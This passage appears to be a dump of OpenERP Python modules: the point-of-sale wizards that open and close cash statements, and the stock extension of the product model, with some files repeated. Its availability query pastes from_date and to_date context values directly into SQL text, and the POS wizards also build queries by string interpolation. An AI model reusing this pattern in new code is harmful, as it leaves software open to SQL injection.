    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
